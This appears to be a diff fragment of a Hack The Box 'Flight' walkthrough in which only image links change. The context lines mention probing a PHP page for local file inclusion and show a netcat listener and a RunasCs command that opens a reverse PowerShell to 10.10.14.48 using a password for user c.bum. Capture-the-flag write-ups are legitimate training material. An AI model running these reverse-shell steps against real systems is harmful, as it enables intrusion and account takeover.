@@ -233,7 +233,7 @@ flight.htb:
 
 school.flight.htb:
 
-<figure><img src="../../../.gitbook/assets/image (2) (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (11) (2).png" alt=""><figcaption></figcaption></figure>
 
 I see a PHP page that calls a script. Let's test if this is injectable by simply attempting an LFI attack.
 
@@ -664,7 +664,7 @@ nc -lnvp 9003
 .\RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.14.48:9003
 ```
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 ### PrivEsc vector
 
